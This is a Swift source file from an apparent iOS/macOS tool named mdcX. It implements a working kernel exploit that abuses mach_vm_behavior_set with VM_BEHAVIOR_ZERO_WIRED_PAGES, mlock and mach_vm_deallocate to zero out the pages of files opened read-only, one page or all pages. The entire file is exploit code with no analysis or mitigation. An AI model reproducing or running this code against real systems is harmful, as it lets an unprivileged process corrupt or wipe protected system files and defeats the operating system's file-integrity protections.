//
//  FileZeroExploit.swift
//  mdcX
//
//  Created by 이지안 on 5/13/25.
//

import Foundation
import Darwin
// import Mach

@_silgen_name("mach_vm_behavior_set")
private func mach_vm_behavior_set(_ target_task: mach_port_t, _ address: UnsafeMutableRawPointer?, _ size: mach_vm_size_t, _ new_behavior: vm_behavior_t) -> kern_return_t

@_silgen_name("mach_vm_deallocate")
private func mach_vm_deallocate(_ target_task: mach_port_t, _ address: UnsafeMutableRawPointer?, _ size: mach_vm_size_t) -> kern_return_t

private func zero_single_page(_ page_address: UnsafeMutableRawPointer?) -> Bool {
    var kr = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_ZERO_WIRED_PAGES)
    guard kr == KERN_SUCCESS else {
        print("SwiftExploit: failed to set VM_BEHAVIOR_ZERO_WIRED_PAGES: \(String(cString: mach_error_string(kr)))")
        return false
    }

    guard mlock(page_address, Int(vm_page_size)) == 0 else {
        perror("SwiftExploit: mlock failed")
        mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        return false
    }
    print("SwiftExploit: mlock success")

    kr = mach_vm_deallocate(mach_task_self_, page_address, mach_vm_size_t(vm_page_size))
    guard kr == KERN_SUCCESS else {
        print("SwiftExploit: vm_deallocate failed: \(String(cString: mach_error_string(kr)))")
        munlock(page_address, Int(vm_page_size))
        mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        return false
    }
    print("SwiftExploit: deleted map entries before unwiring")
    return true
}

@discardableResult
func applySwiftFileZeroExploit(filePath: String, zeroAllPages: Bool = false) -> Int32 {
    let fd = open(filePath, O_RDONLY)
    guard fd != -1 else {
        perror("SwiftExploit: Failed to open file \(filePath)")
        return 1
    }
    defer { close(fd) }

    var st = stat()
    guard fstat(fd, &st) == 0 else {
        perror("SwiftExploit: Failed to fstat file \(filePath)")
        return -1
    }

    guard st.st_size > 0 else {
        print("SwiftExploit: File \(filePath) is empty, nothing to zero.")
        return 0
    }
    
    let mapped_length = Int(st.st_size)
    let ro_addr = mmap(nil, mapped_length, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0)
    
    guard ro_addr != MAP_FAILED else {
        perror("SwiftExploit: mmap failed for \(filePath)")
        return 2 
    }
    defer { munmap(ro_addr, mapped_length) }

    let numberOfPagesToProcess: UInt
    if zeroAllPages {
        numberOfPagesToProcess = (UInt(st.st_size) + UInt(vm_page_size) - 1) / UInt(vm_page_size)
        print("SwiftExploit: Zeroing all \(numberOfPagesToProcess) page(s) for \(filePath).")
    } else {
        numberOfPagesToProcess = st.st_size > 0 ? 1 : 0
        if numberOfPagesToProcess == 1 {
             print("SwiftExploit: Zeroing first page for \(filePath).")
        }
    }
    
    if numberOfPagesToProcess == 0 && st.st_size > 0 {
         print("SwiftExploit: Calculated 0 pages for a non-empty file. This is unexpected.")
         return -2
    }


    for i in 0..<numberOfPagesToProcess {
        guard let page_to_zero = ro_addr?.advanced(by: Int(UInt(vm_page_size) * i)) else {
            print("SwiftExploit: Failed to advance to page \(i) for \(filePath). ro_addr might be nil.")
            return 3
        }
        print("SwiftExploit: Zeroing out page \(i) at \(page_to_zero) for \(filePath)")
        
        guard zero_single_page(page_to_zero) else {
            print("SwiftExploit: zero_single_page failed for page \(i) in \(filePath).")
            return 3
        }
    }

    print("SwiftExploit: Successfully processed pages for \(filePath).")
    return 0
}
